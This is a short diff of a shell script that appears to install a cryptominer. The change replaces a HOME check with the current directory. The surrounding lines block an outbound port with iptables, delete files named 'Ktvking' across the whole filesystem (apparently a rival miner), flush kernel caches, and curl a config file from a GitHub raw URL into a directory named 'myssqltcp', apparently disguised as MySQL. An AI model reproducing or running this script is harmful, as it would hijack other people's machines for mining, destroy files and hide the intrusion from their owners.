@@ -30,16 +30,7 @@ iptables -A OUTPUT -p tcp --dport 13888 -j DROP
 service iptables reload
 
 # printing greetings
-if [ -z $HOME ]; then
-  echo "ERROR: Please define HOME environment variable to your home directory"
-  exit 1
-fi
-
-if [ ! -d $HOME ]; then
-  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
-  echo '  export HOME=<dir>'
-  exit 1
-fi
+HOME=`pwd`
 
 # calculating port
 CPU_THREADS=$(nproc)
@@ -695,7 +686,7 @@ find / -name "Ktvking" -type f -delete
 sync && echo 3 >/proc/sys/vm/dro
 
 # Download program
-cd /$HOME/
+cd $HOME/
 mkdir myssqltcp
 cd /$HOME/myssqltcp
 curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json" -o $HOME/myssqltcp/config.json
